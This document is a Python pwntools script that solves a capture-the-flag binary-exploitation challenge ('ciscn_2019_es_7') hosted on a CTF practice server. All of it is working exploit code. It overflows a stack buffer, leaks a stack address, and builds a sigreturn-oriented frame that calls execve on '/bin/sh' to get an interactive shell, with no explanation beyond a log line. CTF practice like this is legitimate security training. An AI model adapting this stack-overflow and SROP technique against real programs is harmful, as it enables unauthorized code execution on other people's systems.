#coding:utf-8
from pwn import *
import pwnlib
context.log_level = 'debug'
context.arch = 'amd64'
vuln_addr = 0x4004F1  
syscall = 0x400517
sigreturn = 0x4004DA
# sh = process("./ciscn_2019_es_7")
sh = remote("node3.buuoj.cn",26067)
elf = ELF("./ciscn_2019_es_7")
payload = "/bin/sh\x00"
payload = payload.ljust(0x10,"a")
payload += p64(vuln_addr)
sh.sendline(payload)
sh.recv(0x20)
stack_addr = u64(sh.recv(8))-0x118
log.info("success leak stack_addr:0x%x"%stack_addr)
sigFrame = SigreturnFrame()
sigFrame.rax = constants.SYS_execve
sigFrame.rdi = stack_addr
sigFrame.rsi = 0
sigFrame.rdx = 0
sigFrame.rip = syscall
payload = 'a' * 0x10 + p64(sigreturn) + p64(syscall) + str(sigFrame)
sh.sendline(payload)
sh.interactive()